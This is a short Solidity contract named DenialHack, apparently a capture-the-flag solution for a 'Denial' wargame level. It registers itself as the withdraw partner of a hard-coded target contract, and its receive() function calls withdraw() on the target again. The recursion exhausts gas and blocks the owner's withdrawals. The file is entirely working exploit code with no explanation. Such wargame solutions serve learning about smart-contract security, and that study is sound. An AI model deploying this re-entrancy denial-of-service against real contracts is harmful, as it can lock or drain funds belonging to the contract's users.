// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

interface IDenial {
    function withdraw() external;
    function setWithdrawPartner(address) external;
}

contract DenialHack {
    IDenial public denial = IDenial(0xD4E68a2e68A6C41b17D24C7AF036fAa73df967fD);

    function setWithdrawPartner() public {
        denial.setWithdrawPartner(address(this));
    }

    receive() external payable {
        denial.withdraw();
    }
}
